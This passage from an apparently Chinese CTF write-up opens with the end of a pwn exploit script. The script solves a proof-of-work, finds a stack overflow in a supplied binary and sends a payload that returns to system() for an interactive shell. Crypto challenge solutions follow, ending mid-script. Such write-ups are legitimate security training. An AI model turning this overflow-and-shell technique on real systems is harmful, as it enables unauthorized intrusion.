class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(hsh, <span class="built_in">bytes</span>):</span><br><span class="line"></span><br><span class="line">        hsh = hsh.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(suffix, <span class="built_in">bytes</span>):</span><br><span class="line"></span><br><span class="line">        suffix = suffix.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p = [<span class="string">&#x27;hashcat&#x27;</span>, <span class="string">&#x27;--potfile-disable&#x27;</span>, <span class="string">&#x27;--quiet&#x27;</span>, <span class="string">&#x27;--outfile-format&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;-a&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;-m1400&#x27;</span>, hsh.strip(), <span class="string">&#x27;?a?a?a?a&#x27;</span> + suffix.strip()]</span><br><span class="line"></span><br><span class="line">    pio = zio(p)</span><br><span class="line"></span><br><span class="line">    x = pio.readline()</span><br><span class="line"></span><br><span class="line">    pio.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> x[:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;target = %r&#x27;</span> % (target, ))</span><br><span class="line"></span><br><span class="line">io = zio(target, print_read=COLORED(RAW, <span class="string">&#x27;yellow&#x27;</span>), print_write=COLORED(RAW, <span class="string">&#x27;cyan&#x27;</span>), timeout=<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line"></span><br><span class="line">    io.gdb_hint(breakpoints=[</span><br><span class="line"></span><br><span class="line">        <span class="number">0x40141F</span>,</span><br><span class="line"></span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    bin_content = <span class="built_in">open</span>(target, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">    instructions, mapping, reverse_map = load_disasm(<span class="string">&#x27;disasm.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">    io.read_until(<span class="string">b&#x27;sha256(xxxx + &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    suffix = io.read_until(<span class="string">b&#x27;) == &#x27;</span>, keep=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    hsh = io.read_line(keep=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    ans = solve_pow(suffix, hsh)</span><br><span class="line"></span><br><span class="line">    io.read_until(<span class="string">b&#x27;give me xxxx:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    io.writeline(ans)</span><br><span class="line"></span><br><span class="line">    b64 = io.read_until(<span class="string">b&#x27;==end==&#x27;</span>, keep=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    bin_content = base64.b64decode(b64.strip())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;bin.tmp&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">        f.write(bin_content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;bin.tmp.disasm.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">        proc = subprocess.run([<span class="string">&#x27;objdump&#x27;</span>, <span class="string">&#x27;-M&#x27;</span>, <span class="string">&#x27;intel&#x27;</span>,  <span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;./bin.tmp&#x27;</span>], stdout=f, stderr=f)</span><br><span class="line"></span><br><span class="line">    instructions, mapping, reverse_map = load_disasm(<span class="string">&#x27;bin.tmp.disasm.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">idx, overflow_offset, overflow_size = find_overflow()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(idx)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(instructions[idx-<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(instructions[idx-<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(instructions[idx-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(instructions[idx-<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">find_path(idx)</span><br><span class="line"></span><br><span class="line">walk(io)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x401379</span></span><br><span class="line"></span><br><span class="line">system = <span class="number">0x40134C</span></span><br><span class="line"></span><br><span class="line">payload = l64(ret) * ((overflow_offset // <span class="number">8</span>) + <span class="number">1</span>) + l64(ret) + l64(system)</span><br><span class="line"></span><br><span class="line">io.write(payload.ljust(overflow_size, <span class="string">b&#x27;_&#x27;</span>))</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>

<h1><span id="crypto">Crypto</span><a href="#crypto" class="header-anchor"></a></h1><h3><span id="ciruit-map">ciruit map</span><a href="#ciruit-map" class="header-anchor"></a></h3><p>描述：</p>
<p>A valid map</p>
<p>Digital circuits is hard , right?</p>
<p><a href="https://vergissmeinnichtz.github.io/posts/2021dicectf-writeup/">https://vergissmeinnichtz.github.io/posts/2021dicectf-writeup/</a>   2021dicectf原题</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">A, B</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(A, B))</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span> = [</span><br><span class="line"></span><br><span class="line">    [<span class="number">13675268</span>, <span class="number">8343801</span>],</span><br><span class="line"></span><br><span class="line">    [<span class="number">12870274</span>, <span class="number">10251687</span>],</span><br><span class="line"></span><br><span class="line">    [<span class="number">12490757</span>, <span class="number">6827786</span>],</span><br><span class="line"></span><br><span class="line">    [<span class="number">3391233</span>, <span class="number">2096572</span>],</span><br><span class="line"></span><br><span class="line">    [<span class="number">4567418</span>, <span class="number">15707475</span>], </span><br><span class="line"></span><br><span class="line">    [<span class="number">3648155</span>, <span class="number">14095476</span>], </span><br><span class="line"></span><br><span class="line">    [<span class="number">8680011</span>, <span class="number">14409690</span>], </span><br><span class="line"></span><br><span class="line">    [<span class="number">2504390</span>, <span class="number">9376523</span>]  <span class="comment">#先求出的key</span></span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">xor1 = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">input</span>:</span><br><span class="line"></span><br><span class="line">    tmp = <span class="built_in">sum</span>(i)</span><br><span class="line"></span><br><span class="line">    xor1 += <span class="built_in">bytes</span>(long_to_bytes(tmp))</span><br><span class="line"></span><br><span class="line">mask = hashlib.md5(xor1).digest()</span><br><span class="line"></span><br><span class="line">flag = long_to_bytes(<span class="number">0x1661fe85c7b01b3db1d432ad3c5ac83a</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(xor(mask, flag))</span><br></pre></td></tr></table></figure>

<h3><span id="cubic">cubic</span><a href="#cubic" class="header-anchor"></a></h3><p>nc 123.60.153.41 7002</p>
<p>A valid cubic</p>
<p>经典的自定义群运算题目，很显然这是一个有限群，所以其商群必然存在循环群。根据欧拉定理的证明可以得出，欧拉定理适用的条件是循环群，因此该题目定义的群是符合欧拉定理的。RSA也是基于欧拉定理，所以这道题和RSA的解法很像。</p>
<p>现在的关键问题是寻找一种方法求群上元素的阶，这是应用欧拉定理的关键数据。观察代码可以看出这个群的单位元是<code>(None, None)</code>，我们不妨打个表来找一下规律，用下面的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">P, Q, mod</span>):</span><br><span class="line"></span><br><span class="line">    x1, y1 = P</span><br><span class="line"></span><br><span class="line">    x2, y2 = Q</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> x2 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> P</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> x1 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Q</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> y1 <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> y2 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"></span><br><span class="line">        x = x1 * x2 % mod</span><br><span class="line"></span><br><span class="line">        y = (x1 + x2) % mod</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (x, y)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> y1 <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> y2 <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line"></span><br><span class="line">        x1, y1, x2, y2 = x2, y2, x1, y1</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> y2 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (y1 + x2) % mod != <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">            x = (x1 * x2 + <span class="number">2</span>) * inverse(y1 + x2, mod) % mod</span><br><span class="line"></span><br><span class="line">            y = (x1 + y1 * x2) * inverse(y1 + x2, mod) % mod</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (x, y)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> (x1 - y1 ** <span class="number">2</span>) % mod != <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">            x = (x1 * x2 + <span class="number">2</span>) * inverse(x1 - y1 ** <span class="number">2</span>, mod) % mod</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (x, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (x1 + x2 + y1 * y2) % mod != <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">            x = (x1 * x2 + (y1 + y2) * <span class="number">2</span>) * inverse(x1 + x2 + y1 * y2, mod) % mod</span><br><span class="line"></span><br><span class="line">            y = (y1 * x2 + x1 * y2 + <span class="number">2</span>) * inverse(x1 + x2 + y1 * y2, mod) % mod</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (x, y)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> (y1 * x2 + x1 * y2 + <span class="number">2</span>) % mod != <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">            x = (x1 * x2 + (y1 + y2) * <span class="number">2</span>) * inverse(y1 * x2 + x1 * y2 + <span class="number">2</span>, mod) % mod</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (x, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myPower</span>(<span class="params">P, a, mod</span>):</span><br><span class="line"></span><br><span class="line">    target = (<span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    t = P</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> a &gt; <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> a % <span class="number">2</span>:</span><br><span class="line"></span><br><span class="line">            target = add(target, t, mod)</span><br><span class="line"></span><br><span class="line">        t = add(t, t, mod)</span><br><span class="line"></span><br><span class="line">        a &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> target</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genPrime</span>(<span class="params">nbits</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        a = random.getrandbits(nbits // <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        b = random.getrandbits(nbits // <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> b % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        p = a ** <span class="number">2</span> + <span class="number">3</span> * b ** <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> p.bit_length() == nbits <span class="keyword">and</span> p % <span class="number">3</span> == <span class="number">1</span> <span class="keyword">and</span> isPrime(p):</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order</span>(<span class="params">v, p</span>):</span><br><span class="line"></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> myPower(v, i, p) == (<span class="literal">None</span>, <span class="literal">None</span>):</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">test = (<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p\t\torder\t\tp^2\t\t\tp^3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line"></span><br><span class="line">    p = genPrime(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%d\t\t%d\t\t%d\t\t%d&quot;</span> % (p, order(test, p), p ** <span class="number">2</span>, p ** <span class="number">3</span>))</span><br></pre></td></tr></table></figure>

<p>分析输出：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">p</span>        order       p^<span class="number">2</span>         p^<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">199</span>        <span class="number">13267</span>       <span class="number">39601</span>       <span class="number">7880599</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">199</span>        <span class="number">13267</span>       <span class="number">39601</span>       <span class="number">7880599</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">211</span>        <span class="number">14911</span>       <span class="number">44521</span>       <span class="number">9393931</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">199</span>        <span class="number">13267</span>       <span class="number">39601</span>       <span class="number">7880599</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">181</span>        <span class="number">10981</span>       <span class="number">32761</span>       <span class="number">5929741</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">163</span>        <span class="number">1273</span>        <span class="number">26569</span>       <span class="number">4330747</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">211</span>        <span class="number">14911</span>       <span class="number">44521</span>       <span class="number">9393931</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">193</span>        <span class="number">12481</span>       <span class="number">37249</span>       <span class="number">7189057</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">151</span>        <span class="number">7651</span>        <span class="number">22801</span>       <span class="number">3442951</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">241</span>        <span class="number">19441</span>       <span class="number">58081</span>       <span class="number">13997521</span></span><br></pre></td></tr></table></figure>

<p>发现，$p^3-1$都是order的倍数。那么完全可以当作阶来用。又因为flag不会太大，因此题目中用的模数<code>pad*N</code>完全可以用<code>p</code>或者<code>q</code>代替，这样这个题就做出来了。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2 </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RSAdecompose</span>(<span class="params">n, ed</span>): </span><br><span class="line"></span><br><span class="line">    tmp = ed - <span class="number">1</span> </span><br><span class="line"></span><br><span class="line">    s = <span class="number">0</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> tmp % <span class="number">2</span> == <span class="number">0</span>: </span><br><span class="line"></span><br><span class="line">        s += <span class="number">1</span> </span><br><span class="line"></span><br><span class="line">        tmp //= <span class="number">2</span> </span><br><span class="line"></span><br><span class="line">    t = tmp </span><br><span class="line"></span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">    A = <span class="number">0</span> </span><br><span class="line"></span><br><span class="line">    I = <span class="number">0</span> </span><br><span class="line"></span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">    find = <span class="literal">False</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n): </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, s + <span class="number">1</span>): </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">pow</span>(a, <span class="built_in">pow</span>(<span class="number">2</span>, i - <span class="number">1</span>) * t, n) != <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">pow</span>(a, <span class="built_in">pow</span>(<span class="number">2</span>, i - <span class="number">1</span>) * t, n) != n - <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">pow</span>(a, <span class="built_in">pow</span>(<span class="number">2</span>,i) * t, n) == <span class="number">1</span>: </span><br><span class="line"></span><br><span class="line">                A = a </span><br><span class="line"></span><br><span class="line">                I = i </span><br><span class="line"></span><br><span class="line">                find = <span class="literal">True</span> </span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span> </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> find: </span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span> </span><br><span class="line"></span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> A == <span class="number">0</span> <span class="keyword">and</span> I == <span class="number">0</span>: </span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span> </span><br><span class="line"></span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">    p = gcd(<span class="built_in">pow</span>(A, <span class="built_in">pow</span>(<span class="number">2</span>, I - <span class="number">1</span>) * t, n) - <span class="number">1</span>, n) </span><br><span class="line"></span><br><span class="line">    q = n // p </span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> p * q == n </span><br><span class="line"></span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (p, q) </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rational_to_quotients</span>(<span class="params">x, 